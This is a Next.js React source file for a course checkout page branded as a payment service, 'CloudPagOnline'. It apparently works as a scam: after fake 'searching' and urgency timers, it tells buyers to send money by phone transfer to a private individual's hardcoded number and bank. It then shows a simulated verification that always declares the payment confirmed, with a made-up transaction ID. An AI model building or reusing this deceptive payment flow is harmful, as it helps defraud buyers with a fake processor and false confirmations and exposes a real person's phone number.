"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import { CheckCircle2, ChevronDown, ChevronUp, X, Loader2 } from "lucide-react"
import type { Course } from "@/lib/courses-data"

type PaymentTab = "searching" | "details" | "verifying"

export default function CoursePaymentPage() {
  const router = useRouter()
  const [course, setCourse] = useState<Course | null>(null)
  const [currentTab, setCurrentTab] = useState<PaymentTab>("searching")
  const [searchTime, setSearchTime] = useState(180)
  const [paymentTime, setPaymentTime] = useState(600)
  const [showInstructions, setShowInstructions] = useState(false)
  const [verifyProgress, setVerifyProgress] = useState(0)

  const orderId = useMemo(() => `df527e1f-97ec-4bd8-${Math.random().toString(36).slice(2, 6)}`, [])
  const paymentId = useMemo(() => Math.floor(Math.random() * 900000000) + 100000000, [])
  const transactionId = useMemo(() => `TXN-${Math.random().toString(36).slice(2, 10).toUpperCase()}`, [])

  useEffect(() => {
    const stored = sessionStorage.getItem("selectedCourse")
    if (stored) {
      setCourse(JSON.parse(stored))
    } else {
      router.push("/courses")
    }
  }, [router])

  // Tab 1: Searching for requisites
  useEffect(() => {
    if (currentTab !== "searching") return

    const timer = setInterval(() => {
      setSearchTime((prev) => {
        if (prev <= 167) {
          setCurrentTab("details")
          return prev
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [currentTab])

  // Tab 2: Payment timer
  useEffect(() => {
    if (currentTab !== "details") return

    const timer = setInterval(() => {
      setPaymentTime((prev) => {
        if (prev <= 0) return 0
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [currentTab])

  // Tab 3: Verification progress
  useEffect(() => {
    if (currentTab !== "verifying") return

    const timer = setInterval(() => {
      setVerifyProgress((prev) => {
        if (prev >= 100) {
          setTimeout(() => router.push("/courses/success"), 2000)
          return 100
        }
        return prev + 100 / 80
      })
    }, 100)

    return () => clearInterval(timer)
  }, [currentTab, router])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handlePaid = () => {
    setCurrentTab("verifying")
  }

  const handleCancel = () => {
    router.push("/courses")
  }

  const price = course?.discountPrice || 999

  if (!course) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
      </div>
    )
  }

  // Tab 1: Searching
  if (currentTab === "searching") {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
          <div className="mb-6">
            <h2 className="text-xl font-bold text-gray-800 mb-2">CloudPagOnline</h2>
            <p className="text-gray-500 text-sm">Платежная Система</p>
          </div>

          <div className="mb-6">
            <p className="text-gray-600 text-sm mb-4">Заказ № {orderId}</p>
            <div className="w-16 h-16 mx-auto mb-4">
              <Loader2 className="w-full h-full text-blue-500 animate-spin" />
            </div>
            <p className="text-gray-800 font-medium">Поиск реквизитов для оплаты...</p>
          </div>

          <div className="bg-gray-100 rounded-xl p-4">
            <p className="text-gray-500 text-sm mb-1">Осталось времени</p>
            <p className="text-2xl font-bold text-gray-800">{formatTime(searchTime)}</p>
          </div>

          <p className="text-gray-400 text-xs mt-6">Платежный сервис по приему платежей. © 2026 (СБП)</p>
        </div>
      </div>
    )
  }

  // Tab 2: Payment Details
  if (currentTab === "details") {
    return (
      <div className="min-h-screen bg-gray-100 py-8 px-4">
        <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 max-w-md mx-auto">
          <div className="mb-6">
            <h2 className="text-xl font-bold text-gray-800 mb-2">CloudPagOnline</h2>
            <p className="text-gray-500 text-sm">Платежная Система</p>
          </div>

          <div className="flex items-center gap-2 text-green-600 mb-4">
            <CheckCircle2 size={20} />
            <span className="font-medium">Реквизиты найдены</span>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 mb-6">
            <p className="text-yellow-800 text-sm font-medium">
              ⚠️ Переводите точную сумму, иначе перевод не зачислится
            </p>
          </div>

          <div className="bg-gray-50 rounded-xl p-4 mb-6 space-y-3">
            <div className="flex justify-between">
              <span className="text-gray-500">ID платежа:</span>
              <span className="text-gray-800 font-medium">{paymentId}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Сумма:</span>
              <span className="text-green-600 font-bold text-xl">{price.toFixed(2)} RUB</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Номер телефона:</span>
              <span className="text-gray-800 font-medium">+7 903 011 58 50</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">ФИО:</span>
              <span className="text-gray-800 font-medium">Анна В.</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Банк:</span>
              <span className="text-gray-800 font-medium">Ренессанс Банк</span>
            </div>
          </div>

          <button
            onClick={() => setShowInstructions(!showInstructions)}
            className="w-full flex items-center justify-between p-4 bg-gray-100 rounded-xl mb-4 text-gray-700"
          >
            <span className="font-medium">📖 Инструкция по оплате</span>
            {showInstructions ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
          </button>

          {showInstructions && (
            <div className="bg-gray-50 rounded-xl p-4 mb-4 text-sm text-gray-600 space-y-2">
              <p>1. Откройте приложение вашего банка</p>
              <p>2. Выберите раздел "Переводы" → "По номеру телефона"</p>
              <p>3. Введите номер: +7 903 011 58 50</p>
              <p>4. Выберите банк получателя: Ренессанс Банк</p>
              <p>5. Введите точную сумму: {price.toFixed(2)} RUB</p>
              <p>6. Подтвердите перевод</p>
              <p>7. Нажмите кнопку "Я оплатил" ниже</p>
              <p>8. Дождитесь подтверждения платежа</p>
            </div>
          )}

          <div className="space-y-3">
            <button
              onClick={handlePaid}
              className="w-full py-4 px-6 bg-green-500 hover:bg-green-600 text-white rounded-xl font-bold text-lg flex items-center justify-center gap-2 transition-all"
            >
              <CheckCircle2 size={20} />Я ОПЛАТИЛ
            </button>
            <button
              onClick={handleCancel}
              className="w-full py-3 px-6 bg-white border border-gray-200 hover:bg-gray-50 text-gray-500 rounded-xl font-medium flex items-center justify-center gap-2 transition-all"
            >
              <X size={18} className="text-red-500" />
              Отменить
            </button>
          </div>

          <div className={`text-center mt-6 ${paymentTime < 60 ? "animate-pulse" : ""}`}>
            <p className="text-gray-500 text-sm">Время до отмены:</p>
            <p className={`text-xl font-bold ${paymentTime < 60 ? "text-red-500" : "text-gray-800"}`}>
              {formatTime(paymentTime)}
            </p>
          </div>

          <p className="text-gray-400 text-xs text-center mt-6">Платежный сервис по приему платежей. © 2026 (СБП)</p>
        </div>
      </div>
    )
  }

  // Tab 3: Verifying Payment
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
        {verifyProgress < 100 ? (
          <>
            <div className="w-16 h-16 mx-auto mb-6">
              <Loader2 className="w-full h-full text-blue-500 animate-spin" />
            </div>
            <h2 className="text-xl font-bold text-gray-800 mb-4">Проверка платежа...</h2>
            <div className="w-full bg-gray-200 rounded-full h-2 mb-2">
              <div
                className="h-full bg-blue-500 rounded-full transition-all duration-100"
                style={{ width: `${verifyProgress}%` }}
              />
            </div>
            <p className="text-gray-500 text-sm">{Math.round(verifyProgress)}%</p>
          </>
        ) : (
          <>
            <div className="w-20 h-20 mx-auto mb-6 bg-green-100 rounded-full flex items-center justify-center scale-in">
              <CheckCircle2 className="w-12 h-12 text-green-500" />
            </div>
            <h2 className="text-xl font-bold text-green-600 mb-4">ПЛАТЕЖ УСПЕШНО ПОДТВЕРЖДЕН!</h2>
            <div className="bg-gray-50 rounded-xl p-4 text-left space-y-2 mb-6">
              <div className="flex justify-between">
                <span className="text-gray-500">Транзакция:</span>
                <span className="text-gray-800 font-mono">{transactionId}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Сумма:</span>
                <span className="text-green-600 font-bold">{price.toFixed(2)} RUB</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Дата:</span>
                <span className="text-gray-800">{new Date().toLocaleDateString("ru-RU")}</span>
              </div>
            </div>
          </>
        )}

        <p className="text-gray-400 text-xs mt-6">Платежный сервис по приему платежей. © 2026 (СБП)</p>
      </div>
    </div>
  )
}
